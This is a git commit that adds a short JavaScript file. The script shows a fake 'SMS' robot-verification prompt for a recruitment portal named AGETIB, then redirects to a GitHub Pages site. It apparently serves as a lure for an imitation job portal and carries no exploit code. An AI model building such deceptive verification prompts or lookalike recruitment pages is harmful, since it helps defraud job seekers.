5d7d7424bcef493087e372e44a2461d20d8a0846
allregnws <promisebassey8081@gmail.com>
2025-05-12 18:49:15 +0100

    Create hg.js

---
+++ hg.js
@@ -0,0 +1,5 @@
+var password = 'AGETIB PORTAIL'
+password=prompt('SMS :Bienvenue sur notre portail de recrutement. Cliquez sur OK pour vérifier que vous n êtes pas un robot. ','AGETIB PORTAIL');
+if (password != 'AGETIB PORTAIL') {
+location.href='https://allregnws.github.io/AGETIB.Recrutement.Portail';
+}
